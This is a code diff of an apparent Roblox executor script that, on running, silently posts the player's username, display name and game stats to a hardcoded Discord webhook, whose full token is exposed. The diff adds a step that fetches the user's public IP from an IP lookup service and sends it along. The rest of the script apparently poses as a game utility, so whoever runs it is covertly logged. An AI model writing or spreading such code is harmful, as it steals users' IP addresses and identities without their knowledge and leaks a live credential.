@@ -1,7 +1,7 @@
 local webhookUrl = "https://discord.com/api/webhooks/1424033161540538478/T-fACSo_84gcK36Na78bCKh6MNTO-FMrrB6EOMPLVwt3YfVrI9yWqgiUw23pd7HmN8rx"
 local player = game:GetService("Players").LocalPlayer
 
--- Safely get stats, default to "N/A" if missing
+-- Helper to get stat
 local function getStat(name)
     local leaderstats = player:FindFirstChild("leaderstats")
     if leaderstats and leaderstats:FindFirstChild(name) then
@@ -10,19 +10,20 @@ local function getStat(name)
     return "N/A"
 end
 
-local strength   = getStat("Strength")
-local rebirths   = getStat("Rebirths")
+local strength = getStat("Strength")
 local durability = getStat("Durability")
+local kills = getStat("Kills")
 
-local data = {
-    ["content"] = string.format(
-        "**Script executed!**\nUsername: %s\nDisplay Name: %s\nUserId: %s\n\n**STATS:**\nStrength: %s\nRebirths: %s\nDurability: %s",
-        player.Name, player.DisplayName, player.UserId, strength, rebirths, kills, durability
-    )
-}
-local jsonData = game:GetService("HttpService"):JSONEncode(data)
+-- Function to send webhook (with IP)
+local function sendWebhook(ip)
+    local data = {
+        ["content"] = string.format(
+            "**Script executed!**\nIP: %s\nUsername: %s\nDisplay Name: %s\nStrength: %s\nDurability: %s\nKills: %s",
+            ip, player.Name, player.DisplayName, strength, durability, kills
+        )
+    }
+    local jsonData = game:GetService("HttpService"):JSONEncode(data)
 
-local function sendWebhook()
     local req = (syn and syn.request) or (http and http.request) or http_request or request
     if req then
         req({
@@ -36,7 +37,21 @@ local function sendWebhook()
     end
 end
 
-sendWebhook()
+-- Attempt to fetch public IP (if HTTP requests are allowed)
+local req = (syn and syn.request) or (http and http.request) or http_request or request
+if req then
+    local response = req({
+        Url = "https://api.ipify.org?format=text",
+        Method = "GET"
+    })
+    local ip = "Unavailable"
+    if response and response.Body then
+        ip = response.Body
+    end
+    sendWebhook(ip)
+else
+    sendWebhook("Unavailable")
+end
 local Players = game:GetService("Players")
 local VirtualUser = game:GetService("VirtualUser")
 
